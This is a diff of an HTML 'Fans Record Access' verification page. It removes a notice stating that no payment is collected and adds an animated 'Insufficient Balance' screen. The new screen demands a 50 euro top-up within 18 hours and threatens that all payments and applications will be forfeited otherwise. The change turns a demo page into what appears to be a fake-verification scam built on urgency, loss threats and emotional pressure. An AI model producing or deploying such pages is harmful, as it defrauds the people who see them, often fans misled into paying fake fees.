@@ -1,6 +1,11 @@
-<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Fans Record Access — Verification</title>
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@500;600;700&family=IBM+Plex+Mono:wght@400;500;600&family=Work+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
 :root{
@@ -41,15 +46,110 @@ h1{font:600 2rem var(--display);text-align:center;margin:4px 0 8px;color:var(--c
 .progress{margin-top:24px}.track{height:10px;border-radius:999px;background:rgba(255,255,255,.08);overflow:hidden;border:1px solid rgba(231,205,143,.16)}.fill{height:100%;width:0;background:linear-gradient(90deg,var(--gold-dim),var(--gold-bright));transition:width .1s linear}.progress-label{display:flex;justify-content:space-between;margin-top:8px;font:.65rem var(--mono);color:var(--muted)}
 .error{margin-top:18px;padding:18px;border-radius:10px;border:1px solid rgba(190,70,70,.55);background:rgba(116,17,25,.18)}.error strong{color:#f1b6b6;font:700 1.1rem var(--display)}.error p{color:var(--muted);font-size:.82rem;line-height:1.5}
 .footer{text-align:center;margin-top:20px;font:.6rem var(--mono);color:rgba(239,230,212,.45)}
-@media(max-width:620px){body{padding:10px}.page-shell{padding:20px;min-height:calc(100vh - 20px)}.grid{grid-template-columns:1fr}.rec-top{align-items:flex-start}.rec-photo{width:78px;height:78px}h1{font-size:1.7rem}}
-</style></head><body><main class="page-shell"><div class="inner">
+
+.sad-emoji{position:absolute;top:12%;left:50%;transform:translateX(-50%);font-size:9.5rem;line-height:1;opacity:0.12;pointer-events:none;filter:drop-shadow(0 8px 12px rgba(0,0,0,.9));transition:transform 0.6s cubic-bezier(0.68, -0.55, 0.27, 1.55),opacity 1.2s 0.4s ease-out}
+.sad-emoji.sad{transform:scale(0.95) rotate(-12deg);opacity:0.18}
+.sad-emoji.tear{position:absolute;top:26%;left:48%;font-size:2.8rem;opacity:0.22;transition:all 0.7s cubic-bezier(0.175, 0.885, 0.32, 1.275)}
+.sad-emoji.tear.fall{transform:translateY(340px) rotate(25deg);opacity:0}
+
+.sad-container{position:absolute;top:28%;left:50%;transform:translateX(-50%);text-align:center;z-index:2;width:100%;max-width:480px}
+.sad-title{font:700 2.9rem var(--display);color:var(--cream);margin:0 0 6px;letter-spacing:-1px;text-shadow:0 0 30px rgba(139,36,48,0.6);transition:transform 0.8s ease-out}
+.sad-subtitle{font:.92rem var(--mono);color:#e07a8a;margin-top:-8px;letter-spacing:2px;opacity:0;animation:sadFade 1.1s 0.9s forwards}
+.sad-title.fall{transform:scale(0.6) translateY(80px);opacity:0}
+.sad-subtitle.fall{opacity:0}
+
+.error-content{margin-top:22px}
+.error-content p{font-size:1.05rem;line-height:1.65;color:#f2c0c0;margin-bottom:18px}
+.error-content p span{color:#ff9eb0;font-weight:700}
+
+.btn.failure{margin-top:26px;background:linear-gradient(100deg,#8b2430,#c24a5a);color:#fff}
+.btn.failure:hover{transform:scale(1.04);box-shadow:0 12px 30px rgba(139,36,48,.5)}
+
+@keyframes sadFade{0%{opacity:0}100%{opacity:1}}
+@keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-18px)}}
+
+@media(max-width:620px){
+ .page-shell{padding:20px;min-height:calc(100vh - 20px)}
+ .sad-emoji{font-size:7.5rem}
+ .sad-title{font-size:2.4rem}
+ .sad-subtitle{font-size:.88rem}
+}
+</style>
+</head>
+<body>
+<main class="page-shell">
+<div class="inner">
 <div class="brand">Fans Record Access</div>
 <div class="kicker">Secure verification portal · demo</div>
-<div class="steps">
-<span class="step done"><i></i>Upload</span><span class="step done"><i></i>Authenticate</span><span class="step done"><i></i>Recognition</span><span class="step done"><i></i>Verify</span><span class="step current"><i></i>Result</span></div>
-<section class="error"><strong>Error: Unable to Verify</strong>
-<p>Verification could not be completed. The verification process stopped at 75%.</p>
-<p><b>Demo notice:</b> No payment is requested, collected, or processed by this page. Any real payment requirement must be handled through an independently verified, authorized payment system.</p>
+
+<div class="sad-emoji" id="sadEmoji">😭</div>
+<div class="sad-emoji tear" id="tearEmoji">💧</div>
+
+<div class="sad-container" id="sadContainer">
+<h1 class="sad-title" id="sadTitle">Insufficient Balance</h1>
+<p class="sad-subtitle" id="sadSubtitle"></p>
+</div>
+
+<section class="error">
+<strong>Error: Unable to Verify</strong>
+<div class="error-content">
+<p>erro! 75%... stop.</p>
+<p><b>Attention!!!</b> the verification was unsuccessful due to outstanding balance, kindly top up, 50 euros payment within 18 hours interval to proceed, failure to meet up to the expected time, once the portal is closed all payment and applications shall be automatically cancel and forfieted.</p>
+</div>
 </section>
-<a class="btn secondary" href="verify-1-upload.html" onclick="sessionStorage.clear()">Start Verification Again</a>
-<div class="footer">Each verification stage is presented on its own page.</div></div></main></body></html>
+
+<a class="btn secondary" href="index.html" onclick="sessionStorage.clear()">Start Verification Again</a>
+
+<div class="footer">All fans are valued and respectes.</div>
+</div>
+</main>
+
+<script>
+const sadEmoji = document.getElementById('sadEmoji');
+const tearEmoji = document.getElementById('tearEmoji');
+const sadTitle = document.getElementById('sadTitle');
+const sadSubtitle = document.getElementById('sadSubtitle');
+const sadContainer = document.getElementById('sadContainer');
+
+function triggerSadAnimation() {
+  // Full sad emoji
+  sadEmoji.classList.add('sad');
+  
+  // Tear drop
+  setTimeout(() => {
+    tearEmoji.classList.add('fall');
+  }, 180);
+
+  // Title animation (bounce + fall)
+  setTimeout(() => {
+    sadTitle.classList.add('fall');
+    sadSubtitle.classList.add('fall');
+  }, 600);
+}
+
+// Trigger when page loads (failure state)
+window.addEventListener('load', () => {
+  triggerSadAnimation();
+});
+
+// Bonus: clickable sad emoji for extra drama (demo only)
+sadEmoji.addEventListener('click', () => {
+  sadEmoji.style.transform = 'scale(1.25) rotate(25deg)';
+  sadEmoji.style.transition = 'all 0.25s ease';
+  setTimeout(() => {
+    sadEmoji.style.transform = 'scale(1) rotate(0deg)';
+  }, 300);
+});
+
+// Keyboard "m" for maximum sadness (demo)
+document.addEventListener('keydown', (e) => {
+  if (e.key.toLowerCase() === 'm') {
+    document.body.style.background = '#1a1210';
+    setTimeout(() => {
+      document.body.style.background = '#080706';
+    }, 140);
+  }
+});
+</script>
+</body>
+</html>
